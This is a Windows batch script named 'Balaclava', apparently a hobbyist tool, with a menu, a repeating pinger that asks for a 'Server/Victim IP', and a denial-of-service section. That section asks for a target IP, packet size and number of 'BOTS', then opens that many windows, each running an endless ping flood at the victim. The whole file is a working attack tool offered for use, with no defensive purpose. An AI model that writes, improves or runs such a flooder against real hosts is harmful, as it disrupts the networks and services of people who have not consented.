@echo off
title Balaclava - - - [@%USERNAME%]
chcp 65001
cls

:: [BALACLAVA] GUI'S

:main
cls
type logo.clava
echo.
set /p mainques=" [40;37m~ [40;31m "
if %mainques%==1 goto pinger
if %mainques%==2 goto ddos
if %mainques%==3 goto credits
goto main


:credits
cls
type credits.clava 
echo.
set /p credits=" [40;37m~ [40;31m "
if %credits%==1 start https://github.com/moneyrain
if %credits%==2 start https://www.youtube.com/channel/UCY6sW76KyYTL8U6UbeBD1yA?sub_confirmation=1
if %credits%==3 goto main
goto credits

:: [BALACLAVA] Pinger

:pinger
SETLOCAL EnableDelayedExpansion
cls
echo.
echo   [40;31m██ ██████       [40;37m█████  ██████  ██████  ███████ ███████ ███████ 
echo   [40;31m██ ██   ██     [40;37m██   ██ ██   ██ ██   ██ ██      ██      ██      
echo   [40;31m██ ██████      [40;37m███████ ██   ██ ██████  █████   ███████ ███████ 
echo   [40;31m██ ██          [40;37m██   ██ ██   ██ ██   ██ ██           ██      ██ 
echo   [40;31m██ ██          [40;37m██   ██ ██████  ██   ██ ███████ ███████ ███████ 
echo. 
echo                    [40;32mServer/Victim IP Adress
echo.                                                           
set /p pingerip=" [40;37m~ [40;31m "
:pinging
for /f "delims=" %%A in ('ping -4 -n  1 %pingerip% ^| Find "Reply"') do set "var=%%A"
cls
type pinger.clava & echo       [40;31m%var%
ping localhost -n 2 >nul
goto pinging




:: [BALACLAVA] DOS

:ddos
cls
echo.
echo   [40;31m██ ██████       [40;37m█████  ██████  ██████  ███████ ███████ ███████ 
echo   [40;31m██ ██   ██     [40;37m██   ██ ██   ██ ██   ██ ██      ██      ██      
echo   [40;31m██ ██████      [40;37m███████ ██   ██ ██████  █████   ███████ ███████ 
echo   [40;31m██ ██          [40;37m██   ██ ██   ██ ██   ██ ██           ██      ██ 
echo   [40;31m██ ██          [40;37m██   ██ ██████  ██   ██ ███████ ███████ ███████ 
echo. 
echo                    [40;32mServer/Victim IP Adress
echo.                                                           
set /p ip=" [40;37m~ [40;31m "
cls
echo.
echo   [40;31m██████   [40;37m█████   ██████ ██   ██ ███████ ████████ ███████ 
echo   [40;31m██   ██ [40;37m██   ██ ██      ██  ██  ██         ██    ██      
echo   [40;31m██████  [40;37m███████ ██      █████   █████      ██    ███████ 
echo   [40;31m██      [40;37m██   ██ ██      ██  ██  ██         ██         ██ 
echo   [40;31m██      [40;37m██   ██  ██████ ██   ██ ███████    ██    ███████ 
echo.
echo               [40;32m1200 or Lower (Recommended)
echo.
echo           [40;31m@balaclava[40;37m: Send Attack to [40;31m%ip%                                                        
echo.
set /p packets=" [40;37m~ [40;31m "
cls
echo.
echo   [40;31m██     ██ [40;37m██ ███    ██ ██████   ██████  ██     ██ ███████ 
echo   [40;31m██     ██ [40;37m██ ████   ██ ██   ██ ██    ██ ██     ██ ██      
echo   [40;31m██  █  ██ [40;37m██ ██ ██  ██ ██   ██ ██    ██ ██  █  ██ ███████ 
echo   [40;31m██ ███ ██ [40;37m██ ██  ██ ██ ██   ██ ██    ██ ██ ███ ██      ██ 
echo    [40;31m███ ███  [40;37m██ ██   ████ ██████   ██████   ███ ███  ███████ 
echo.
echo             [40;32mHow many DoS Windows you want?
echo.
echo    [40;31m@balaclava[40;37m: Send Attack to [40;31m%ip% [40;37mwith [40;31m%packets% Packets[40;37m.                                                        
echo.
set /p windowsOpen=" [40;37m~ [40;31m "
cls
echo.
echo   [40;37m███████ ███████ ███    ██ ██████  ██ ███    ██  ██████       [40;31m█████  ████████ ████████  █████   ██████ ██   ██ 
echo   [40;37m██      ██      ████   ██ ██   ██ ██ ████   ██ ██           [40;31m██   ██    ██       ██    ██   ██ ██      ██  ██  
echo   [40;37m███████ █████   ██ ██  ██ ██   ██ ██ ██ ██  ██ ██   ███     [40;31m███████    ██       ██    ███████ ██      █████   
echo        [40;37m██ ██      ██  ██ ██ ██   ██ ██ ██  ██ ██ ██    ██     [40;31m██   ██    ██       ██    ██   ██ ██      ██  ██  
echo   [40;37m███████ ███████ ██   ████ ██████  ██ ██   ████  ██████      [40;31m██   ██    ██       ██    ██   ██  ██████ ██   ██  
echo.
echo             [40;31m@balaclava[40;37m: Sending Attack to [40;31m%ip% [40;37mwith [40;31m%packets% Packets [40;37m ^| [40;31m%windowsOpen% BOTS[40;37m.
echo.
ping localhost -n 4 >nul
for /L %%a in (1,1,%windowsOpen%) do (%
start ping %ip% -t -l %packets%  
)










                                